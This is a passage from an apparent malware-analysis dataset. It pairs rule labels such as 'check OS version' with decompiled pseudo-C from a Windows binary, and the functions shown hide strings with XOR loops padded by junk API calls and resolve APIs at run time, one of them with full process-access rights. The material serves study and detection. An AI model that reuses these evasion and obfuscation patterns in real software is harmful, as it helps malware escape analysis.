(*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_ch = 5;\n        iVar6 = 0;\n        var_14h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            if (iVar3 != 0x7b0fea) {\n                *(iVar6 + iVar2) = *(&var_20h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_30h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_10h = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar2);\n        if (var_10h == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            return var_4h;\n        }\n        var_30h = 0x1165728;\n        var_2ch._0_1_ = 0x39;\n        var_2ch._1_1_ = 5;\n        var_2ch._2_2_ = 0x2057;\n        var_28h._0_1_ = 0x21;\n        var_28h._1_1_ = 0x3a;\n        var_28h._2_1_ = 100;\n        var_20h = 0x4d643364;\n        var_1ch._0_1_ = 0x56;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_18h = iVar2;\n        var_8h = &var_30h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            if (iVar3 != 0x4dead6) {\n                *(iVar6 + iVar2) = *(&var_20h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_30h - iVar2];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0xb);\n        *0x41cb00 = fcn.0040d1ea();\n        iVar6 = var_14h;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        *0x41cb04 = *0x41cb00 >> 0x1f;\n        if ((*0x41cb00 | *0x41cb04) == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x3107512e;\n            var_44h = 0x7651635;\n            var_40h = 0x51073319;\n            var_3ch = 0x23350400;\n            var_38h = 0x35041151;\n            var_34h._0_2_ = 0x4611;\n            var_34h._2_1_ = 0x75;\n            var_2ch._0_1_ = 0x62;\n            var_2ch._1_1_ = 0x35;\n            var_2ch._2_2_ = 0x7675;\n            var_28h._0_1_ = 0x50;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_48h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetInputState)();\n                if (iVar3 != 0xa8c8f6) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_48h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41cb08 = fcn.0040d1ea();\n            iVar6 = var_14h;\n            iVar2 = var_18h;\n            *0x41cb0c = *0x41cb08 >> 0x1f;\n            if ((*0x41cb08 | *0x41cb0c) == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar4)(uVar1);\n                uVar1 = (*pcVar7)(0, iVar6);\n                (*pcVar4)(uVar1);\n                return var_4h;\n            }\n            var_48h = 0x3e253d22;\n            var_44h = 0x291d1d20;\n            var_40h = 0x1b261a01;\n            var_3ch = 0x20143f0c;\n            var_38h = 0x25150c02;\n            var_34h._0_2_ = 0x3507;\n            var_34h._2_1_ = 0x4f;\n            var_2ch._0_1_ = 0x78;\n            var_2ch._1_1_ = 0x4a;\n            var_2ch._2_2_ = 0x4c75;\n            var_28h._0_1_ = 0x4f;\n            var_28h._1_1_ = 0x69;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_20h = &var_48h - iVar2;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                if (iVar3 != 0x4c5800) {\n                    var_20h = 6;\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % 6) ^ (iVar6 + iVar2)[&var_48h - iVar2];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x17);\n            *0x41cb10 = fcn.0040d1ea();\n            iVar6 = var_14h;\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            *0x41cb14 = *0x41cb10 >> 0x1f;\n            if ((*0x41cb10 | *0x41cb14) != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar4)(0, var_8h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, var_18h);\n                (*pcVar7)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar6);\n                (*pcVar7)(uVar1);\n                goto code_r0x0040362f;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar4)(0, var_8h);\n            (*pcVar7)(uVar1);\n            uVar1 = (*pcVar4)(0, var_18h);\n        }\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar4)(0, iVar6);\n        (*pcVar7)(uVar1);\n    }\n    else {\ncode_r0x0040362f:\n        puVar5 = 0x41cb00;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_24h = *puVar5;\n            puVar5 = puVar5 + 1;\n            var_24h = var_24h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2503
    },
    "00403645": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00403645(uchar *param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_24h = param_1;\n    if ((((*0x41cb18 | *0x41cb1c) == 0) || ((*0x41cb20 | *0x41cb24) == 0)) || ((*0x41cb28 | *0x41cb2c) == 0)) {\n        var_4h = 0x7f;\n        var_30h = 0xa15231f;\n        var_2ch._0_1_ = 0x23;\n        var_2ch._1_1_ = 0x5f;\n        var_2ch._2_2_ = 0x1d33;\n        var_28h._0_1_ = 10;\n        var_28h._1_1_ = 0x4f;\n        var_20h = 0x66715771;\n        var_1ch._0_1_ = 0x4f;\n        var_14h = param_2;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        var_ch = 5;\n        iVar7 = 0;\n        var_10h = iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            if (iVar3 != 0x7b0fea) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_30h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 10);\n        var_30h = 0x1165728;\n        var_2ch._0_1_ = 0x39;\n        var_2ch._1_1_ = 5;\n        var_2ch._2_2_ = 0x2057;\n        var_28h._0_1_ = 0x21;\n        var_28h._1_1_ = 0x3a;\n        var_28h._2_1_ = 100;\n        var_20h = 0x4d643364;\n        var_1ch._0_1_ = 0x56;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        var_18h = iVar2;\n        var_8h = &var_30h - iVar2;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar3 = var_10h;\n            if (iVar4 != 0x4dead6) {\n                *(iVar7 + iVar2) = *(&var_20h + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_30h - iVar2];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xb);\n        *0x41cb18 = fcn.0040dfff(iVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (*0x41cb18 == 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x3107512e;\n            var_44h = 0x7651635;\n            var_40h = 0x51073319;\n            var_3ch = 0x23350400;\n            var_38h = 0x35041151;\n            var_34h._0_2_ = 0x4611;\n            var_34h._2_1_ = 0x75;\n            var_2ch._0_1_ = 0x62;\n            var_2ch._1_1_ = 0x35;\n            var_2ch._2_2_ = 0x7675;\n            var_28h._0_1_ = 0x50;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_48h - iVar2;\n            var_8h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n                iVar3 = var_10h;\n                if (iVar4 != 0xa8c8f6) {\n                    *(iVar7 + iVar2) = *(&var_2ch + iVar7 % var_ch) ^ (iVar7 + iVar2)[&var_48h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41cb20 = fcn.0040dfff(iVar2);\n            iVar2 = var_18h;\n            if (*0x41cb20 == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar5)(uVar1);\n                uVar1 = (*pcVar8)(0, iVar3);\n                (*pcVar5)(uVar1);\n                goto code_r0x00403977;\n            }\n            var_48h = 0x3e253d22;\n            var_44h = 0x291d1d20;\n            var_40h = 0x1b261a01;\n            var_3ch = 0x20143f0c;\n            var_38h = 0x25150c02;\n            var_34h._0_2_ = 0x3507;\n            var_34h._2_1_ = 0x4f;\n            var_2ch._0_1_ = 0x78;\n            var_2ch._1_1_ = 0x4a;\n            var_2ch._2_2_ = 0x4c75;\n            var_28h._0_1_ = 0x4f;\n            var_28h._1_1_ = 0x69;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            var_20h = &var_48h - iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n                iVar3 = var_10h;\n                if (iVar4 != 0x4c5800) {\n                    var_20h = 6;\n                    *(iVar7 + iVar2) = *(&var_2ch + iVar7 % 6) ^ (iVar7 + iVar2)[&var_48h - iVar2];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x17);\n            *0x41cb28 = fcn.0040dfff(iVar2);\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x41cb28 != 0) {\n                var_4h = 0;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, var_8h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, var_18h);\n                (*pcVar8)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar8)(uVar1);\n                goto code_r0x0040396a;\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*pcVar5)(0, var_8h);\n            (*pcVar8)(uVar1);\n            uVar1 = (*pcVar5)(0, var_18h);\n        }\n        (*pcVar8)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar8)(uVar1);\n    }\n    else {\ncode_r0x0040396a:\n        puVar6 = 0x41cb18;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_24h = *puVar6;\n            puVar6 = puVar6 + 1;\n            var_24h = var_24h + 1;\n        }\n    }\ncode_r0x00403977:\n    *0x41cb2c = *0x41cb28 >> 0x20;\n    *0x41cb24 = *0x41cb20 >> 0x20;\n    *0x41cb1c = *0x41cb18 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2431
    },
    "00406e70": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __fastcall fcn.00406e70(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    code *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    var_8h = 0xc0000023;\n    if (((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) {\n        piVar1 = param_1[1];\n        if (piVar1 != NULL) {\n            if (*param_1 == *piVar1) {\n                var_44h = 0x81d3222;\n                var_40h = 0x2b1f1210;\n                var_3ch = 0x2103e01;\n                var_38h = 0x2a040403;\n                var_34h = 0x46021413;\n                var_2ch = 0x4c714670;\n                var_28h._0_2_ = 0x7175;\n                var_24h = param_2;\n                var_20h = param_1;\n                var_8h = piVar1;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                var_4h = 0;\n                var_18h = &var_44h - iVar5;\n                var_1ch = iVar5;\n                do {\n                    iVar6 = (*_sym.imp.USER32.dll_GetFocus)();\n                    if (iVar6 != 0x4872cb) {\n                        var_14h = 6;\n                        *(var_4h + iVar5) = *(&var_2ch + var_4h % 6) ^ (var_4h + iVar5)[var_18h];\n                    }\n                    var_4h = var_4h + 1;\n                } while (var_4h < 0x14);\n                var_30h = 0xa15231f;\n                var_2ch = 0x1d335f23;\n                var_28h._0_2_ = 0x4f0a;\n                var_14h = 0x66715771;\n                var_10h._0_1_ = 0x4f;\n                uVar4 = (*pcVar2)(8, 0xb);\n                iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = 0;\n                var_18h = &var_30h - iVar5;\n                do {\n                    iVar7 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                    iVar3 = var_1ch;\n                    if (iVar7 != 0x7b0fea) {\n                        var_18h = 5;\n                        *(iVar6 + iVar5) = *(&var_14h + iVar6 % 5) ^ (iVar6 + iVar5)[&var_30h - iVar5];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 10);\n                uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar5, var_1ch);\n                var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n                piVar1 = var_8h;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_8h[1]);\n                var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                iVar6 = *piVar1;\n                var_20h = var_20h[1] + 0xc;\n                fcn.00406dde();\n                piVar1 = var_8h;\n                var_8h = (*var_1ch)(2, var_4h, var_8h[1], var_20h, iVar6 + -0xc, &var_ch);\n                if (var_8h == NULL) {\n                    if (var_ch == piVar1[1]) {\n                        var_24h[1] = var_4h;\n                        *var_24h = var_ch;\n                    }\n                    else {\n                        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                        var_8h = 0xc000007b;\n                    }\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar4 = (*pcVar2)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            }\n            else {\n                var_8h = 0xc000007b;\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1311
    },
    "004075b0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004075b0(uint param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar7 = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_18h = 0;\n    iVar2 = fcn.00407066(&var_8h);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.SHLWAPI.dll_StrDupW)(param_1);\n        var_14h = iVar2;\n        var_10h = fcn.0040e5d6();\n        pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (var_10h != 0) {\n            var_2ch = 0x34593565;\n            var_28h = 0x30534b00;\n            var_24h._0_2_ = 0x6e34;\n            var_20h = 0x3430354b;\n            var_1ch._0_1_ = 0x6e;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar8 = iVar7;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                iVar2 = var_14h;\n                iVar7 = var_18h;\n                if (iVar5 != 0x3b4803) {\n                    var_ch = 5;\n                    *(iVar8 + piVar4) = *(&var_20h + iVar8 % 5) ^ (iVar8 + piVar4)[&var_2ch - piVar4];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 10);\n            piVar6 = piVar4;\n            do {\n                iVar1 = *piVar6;\n                *((var_10h - piVar4) + piVar6) = iVar1;\n                pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar8 = fcn.0040fa39(var_8h);\n        if (iVar8 == 0) {\n            iVar8 = fcn.00407172();\n            if (iVar8 != 0) {\n                iVar7 = 1;\n            }\n        }\n        if (iVar2 != 0) {\n            uVar3 = (*pcVar9)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        uVar3 = (*pcVar9)(0, var_4h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar7;\n}\n",
        "token_count": 826
    },
    "0040d2e9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d2e9(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xa15231f;\n    var_20h = 0x1d335f23;\n    var_1ch._0_2_ = 0x4f0a;\n    var_18h = 0x66715771;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x4f);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x44090d32;\n    var_24h = 0x8383924;\n    var_20h = 0x24245729;\n    var_1ch._0_2_ = 0x7a1b;\n    var_18h = 0x34467a68;\n    var_14h._0_2_ = 0x5741;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x527d47) {\n            var_8h = 6;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 6) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 859
    },
    "0040dafc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040dafc(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41cda8 | *0x41cdac) != 0) {\ncode_r0x0040deb0:\n        var_ch = 0x41cda8;\n        goto code_r0x0040deb5;\n    }\n    var_30h = 0xa15231f;\n    var_2ch = 0x1d335f23;\n    var_28h._0_2_ = 0x4f0a;\n    var_24h = 0x66715771;\n    var_20h._0_1_ = 0x4f;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_1ch = 5;\n    iVar6 = 0;\n    var_18h = &var_30h - iVar2;\n    var_8h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0x7b0fea) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_18h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_48h = 0x27111e6b;\n    var_44h = 0x75e1642;\n    var_40h = 0x214e2722;\n    var_3ch._0_2_ = 0x165;\n    var_3ch._2_1_ = 0x24;\n    var_3ch._3_1_ = 0x27;\n    var_38h._0_2_ = 0x3157;\n    var_38h._2_1_ = 0x31;\n    var_2ch = 0x42566931;\n    var_28h._0_2_ = 0x5536;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_18h = 6;\n    iVar6 = 0;\n    var_10h = &var_48h - iVar2;\n    var_14h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n        iVar3 = var_8h;\n        if (iVar4 != 0xd32bc4) {\n            *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_10h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41cda8 = fcn.0040dfff(iVar2);\n    if (*0x41cda8 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x0040dc30:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_48h = 0x27152432;\n        var_44h = 0x3d072f33;\n        var_40h = 0x183f2732;\n        var_3ch._0_2_ = 0x3b3c;\n        var_3ch._2_1_ = 0x34;\n        var_3ch._3_1_ = 0x27;\n        var_38h._0_2_ = 0x826;\n        var_38h._2_1_ = 0x68;\n        var_2ch = 0x42465368;\n        var_28h._0_2_ = 0x6c47;\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_10h = &var_48h - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n            iVar3 = var_8h;\n            if (iVar4 != 0xd0fac1) {\n                *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41cdb0 = fcn.0040dfff(iVar2);\n        iVar2 = var_14h;\n        if (*0x41cdb0 == 0) {\n            uVar1 = (*pcVar5)(0, var_4h);\n            pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_48h = 0x2d1f4714;\n            var_44h = 0x37591802;\n            var_40h = 0x63283d3b;\n            var_3ch._0_2_ = 0x2f37;\n            var_3ch._2_1_ = 6;\n            var_3ch._3_1_ = 0x27;\n            var_38h._0_2_ = 0x3c5f;\n            var_38h._2_1_ = 0x4c;\n            var_2ch = 0x4c52304e;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x72);\n            uVar1 = (*pcVar5)(8, 0x14);\n            iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_24h = &var_48h - iVar2;\n            var_10h = iVar2;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                iVar3 = var_8h;\n                if (iVar4 != 0x944140) {\n                    *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_24h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x13);\n            *0x41cdb8 = fcn.0040dfff(iVar2);\n            iVar2 = var_14h;\n            if (*0x41cdb8 != 0) {\n                var_48h = 0x26212028;\n                var_44h = 0x1022204;\n                var_40h = 0xc1e2d1d;\n                var_3ch._0_2_ = 0x414;\n                var_3ch._2_1_ = 0x11;\n                var_3ch._3_1_ = 